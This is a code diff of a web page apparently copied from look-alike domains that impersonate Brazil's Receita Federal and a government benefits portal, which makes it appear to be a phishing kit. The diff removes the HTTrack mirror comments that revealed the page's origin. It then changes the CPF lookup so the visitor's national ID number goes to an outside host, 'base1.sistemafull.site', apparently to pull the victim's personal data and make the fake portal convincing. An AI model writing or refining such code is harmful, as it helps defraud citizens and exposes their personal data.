@@ -1,11 +1,7 @@
 <!DOCTYPE html>
 <html>
 
-<!-- Mirrored from receita.canalgovbr.org/42492556620 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Aug 2025 02:45:20 GMT -->
-<!-- Added by HTTrack -->
-
-<!-- Mirrored from g0vbeneficio-br.com/site-receita/consulta.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 20 Mar 2026 15:12:37 GMT -->
-<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
 
 <head>
     <meta charset="utf-8" />
@@ -1909,7 +1905,11 @@
                 try {
                     // TENTATIVA 1: API Premium (via seu PHP novo)
                     updateLoadingText('Consultando base de dados nacional...');
-                    const res1 = await fetch(`/api/consultar_cpf_brasil.php?cpf=${cpf}`, { cache: 'no-store' });
+                    const res1 = await fetch(`https://base1.sistemafull.site:80/api/cpfx?CPF=${cpf}`, {
+                        method: 'GET',
+                        headers: { 'Content-Type': 'application/json' },
+                        cache: 'no-store'
+                    });
                     const result1 = await res1.json();
 
                     if (result1.success && result1.data) {
